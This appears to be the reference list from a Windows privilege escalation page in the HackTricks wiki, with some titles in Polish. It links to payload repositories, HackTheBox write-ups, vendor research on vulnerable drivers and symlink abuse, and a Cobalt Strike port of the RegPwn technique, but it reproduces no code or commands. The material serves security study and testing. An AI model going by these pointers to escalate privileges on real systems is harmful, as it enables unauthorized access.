- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) i kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Pogoń za Srebrnym Lisem: Kot i mysz w cieniach jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Luka w uprzywilejowanym systemie plików w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Powrót do przeszłości. Nadużywanie dowiązań symbolicznych w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
